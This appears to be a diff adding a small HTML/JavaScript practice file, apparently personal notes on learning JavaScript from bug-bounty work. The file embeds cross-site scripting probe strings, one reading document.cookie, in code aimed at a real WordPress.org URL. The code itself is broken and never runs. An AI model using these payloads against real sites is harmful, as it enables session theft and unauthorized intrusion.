@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+</head>
+<body>
+	<script type="text/javascript">
+		var x=createXMLHTTPObject();
+		var url="https://wordpress.org/support/wp-content/mu-plugins/pub-sync/blocks/global-header-footer/js/wporg-global-header-script.js?ver=1646690162"
+		function request(url){
+		x.open("POST",url,false);
+        let newItem=document.createElement('li');
+		newItem.classlist.add('><iframe src='javascript:alert(document.cookie)'></iframe>');
+		let newsubmenu=document.createElement('ul');
+	newsubmenu.classlist.add('</script><script>alert(1)</script>');
+	newItem.appendchild(newsubmenu);
+    x.send(newItem);
+}
+	</script>
+
+</body>
+</html>
+
+/*xmlHttp.open("GET","server.asp",false)*/
+/*xmlHttp.send(null);*/
+/*alert(xmlHttp.responseText);*/
+/* document.write(navigator.platform)*/
+
+
+/*  Notes on learning js from bounty bugs before */
+/* 2022/7/15  */
